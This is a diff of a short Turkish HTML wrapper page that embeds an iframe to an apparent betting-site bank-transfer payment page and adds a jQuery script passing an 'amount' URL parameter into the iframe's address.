@@ -1,8 +1,37 @@
-
-<html lang="tr"><head>
+<html lang="tr">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-</head><body>
-<iframe src="https://xn--jojbet846-nl7d.com/tr/odeme-sayfa/havaleode.php" style="border:none;" name="srame" scrolling="no" frameborder="0" marginheight="-1px" marginwidth="-1px" height="677px" width="375px" allowfullscreen></iframe>
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+</head>
+<body>
+
+<script>
+    $(document).ready(function() {
+        // URL'den 'amount' değerini al
+        var amountValue = getUrlParameter('amount');
+
+        // iframe'in src linkine 'amount' değerini ekle
+        var iframeSrc = "https://xn--jojbet846-nl7d.com/tr/odeme-sayfa/havaleode.php?amount=" + encodeURIComponent(amountValue);
+        $('iframe[name="srame"]').attr('src', iframeSrc);
+        
+        // iframe'i çalıştır
+        $('iframe[name="srame"]').on('load', function() {
+            // İframe yüklendikten sonra bu kısım çalıştırılabilir (isteğe bağlı)
+            console.log('İframe yüklendi.');
+        });
+    });
+
+    // URL'den parametre almak için yardımcı fonksiyon
+    function getUrlParameter(name) {
+        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+        var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+        var results = regex.exec(location.search);
+        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+    }
+</script>
+
+<iframe src="" style="border:none;" name="srame" scrolling="yes" frameborder="0" marginheight="-1px" marginwidth="-1px" height="677px" width="375px" allowfullscreen></iframe>
+
 </body>
 </html>
